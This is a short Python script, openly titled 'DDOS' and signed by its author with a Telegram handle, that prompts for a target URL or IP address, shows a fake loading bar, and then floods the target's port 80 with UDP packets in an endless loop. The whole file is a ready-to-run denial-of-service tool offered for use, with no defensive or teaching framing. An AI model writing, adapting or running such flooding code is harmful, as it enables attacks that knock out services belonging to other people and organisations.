import time
import socket
import os
red='\033[31m'
green='\033[32m'
os.system("pkg install toilet -y ")
os.system("pkg install figlet -y ")
os.system("clear")
os.system("toilet -f mono12 -F gay DDOS")
print(f"{green}==================================")
print(" made by bad_boy ")
print(" my telegram id: @Bad_boy_468 ")
print( "   =====================================")
target = input(f"{green}Enter Target url or Ip : ")
target.replace("http://", "")
target.replace("https://","")
target.replace("www.","")
ip = socket.gethostbyname(target)
port = 80
joker = "DDOSjsjsjjdjdjdjdjjjjjjjjjiiiiiiiopppkkkkjjjjjhhhbbbbgbvvvvvvvvvvvvhhyggggh"
os.system("clear")
os.system("toilet -f mono12 LOADING | lolcat")
print("Loading{~~~ }5%")
time.sleep(3)
print("Loading{~~~~~ }10%")
time.sleep(3)
print("Loading{~~~~~~~~ }40%")
time.sleep(3)
print("Loading{~~~~~~~~~~~~~~ }90%")
time.sleep(3)
print("Loading{~~~~~~~~~~~~~~~~}100%")
os.system("clear")
os.system("figlet Attack_Starting")
while True:
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     sock.sendto(bytes(joker,"UTF-8"), (ip,port))
     print(port,"<===send packet to ===>",ip)
